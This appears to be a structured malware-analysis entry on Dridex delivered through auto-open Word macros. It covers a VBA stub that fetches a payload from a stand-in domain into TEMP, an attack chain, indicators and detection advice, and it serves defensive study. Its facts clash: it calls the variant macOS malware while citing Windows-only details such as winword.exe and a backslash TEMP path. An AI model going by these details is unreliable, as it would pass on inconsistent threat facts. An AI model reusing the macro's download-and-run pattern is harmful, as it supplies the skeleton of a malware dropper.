package_info.package_manager: N/A (malicious macro embedded in Word document)
package_info.package_versions: N/A (malicious document, not a software package)
package_info.why_malicious: The Dridex banking malware variant for macOS is distributed via Word documents containing auto-open macros. These macros execute automatically when the document is opened, downloading and executing a malicious payload that targets banking credentials and other sensitive information. The use of auto-executing macros for malware delivery is a well-known attack vector and is considered highly malicious due to its ability to bypass user interaction and deliver malware directly upon document open.

execution_context.file_location: Embedded macro in Word document (typically in the 'ThisDocument' module or 'AutoOpen' macro section)

malicious_snippets.code_snippet:
Sub AutoOpen()
    ' Malicious payload code here
    Call Main
End Sub

Sub Main()
    ' Download and execute Dridex payload
    Dim url As String
    url = "http://malicious-domain.com/payload"
    Dim filePath As String
    filePath = Environ("TEMP") & "\payload"
    ' Download payload
    ' Execute payload
End Sub
malicious_snippets.code_behavior: At import-time (when the document is opened), the macro automatically downloads a malicious payload from a remote server using an HTTP request, writes the payload to the user's TEMP directory, and executes the downloaded file, resulting in the installation and activation of Dridex malware.

malice_analysis.why_suspicious: The macro is configured to execute automatically upon document open, immediately initiating a download of an executable payload from an external domain and executing it without user consent. This sequence is a hallmark of malware delivery and is rarely, if ever, seen in legitimate macros.
malice_analysis.violated_expectations: Normal Word documents should not contain macros that execute automatically or perform network operations to download and run external code. Legitimate macros are typically user-initiated and do not perform process creation or download executables from the internet.
malice_analysis.similar_legitimate_use: Some enterprise workflows use auto-open macros for document automation, such as formatting or data population, but these should never download or execute code from the internet or spawn new processes.
key_indicators: Presence of AutoOpen or Document_Open macro in the document
Macro code containing hardcoded URLs or domains for payload download
Use of Environ("TEMP") or similar to write files to the TEMP directory
Office process (e.g., winword.exe) spawning child processes to execute downloaded files
Immediate network activity from Office application upon document open

attack_chain.action: User opens the malicious Word document, triggering the AutoOpen macro.
attack_chain.leads_to: Macro executes and initiates download of the Dridex payload.

attack_chain.action: Macro downloads the Dridex malware payload from a remote server using an HTTP request.
attack_chain.leads_to: Payload is saved to the user's TEMP directory.

attack_chain.action: Macro executes the downloaded payload from the TEMP directory.
attack_chain.leads_to: Dridex malware is installed and begins credential theft and other malicious activities.

behavioral_signatures: Presence of AutoOpen or Document_Open macro in Office documents
Office process (e.g., winword.exe) spawning child processes (such as curl, wget, bash, or other executables)
Office document initiating outbound network connections to download executables immediately upon open
Creation of new executable files in the user's TEMP directory by Office processes
file_indicators: Word documents (.doc, .docm) with embedded macros in the 'ThisDocument' or macro modules
Temporary files created in the user's TEMP directory with non-standard or suspicious names (e.g., 'payload')
Presence of newly downloaded executables in TEMP directory shortly after document open
network_indicators: Outbound HTTP/HTTPS requests from Office applications to unknown or suspicious domains (e.g., 'malicious-domain.com')
Connections to known Dridex command-and-control (C2) infrastructure
Unusual network activity from Office processes immediately after document open
detection_knowledge.how_to_detect: Monitor for Office documents containing auto-executing macros (AutoOpen, Document_Open). Alert when Office processes (such as winword.exe) initiate outbound network connections or spawn child processes to execute files. Use endpoint protection to detect and block known Dridex payloads and associated IOCs. Employ sandboxing to analyze document behavior before delivery to end users, and flag documents that attempt to download and execute external code.
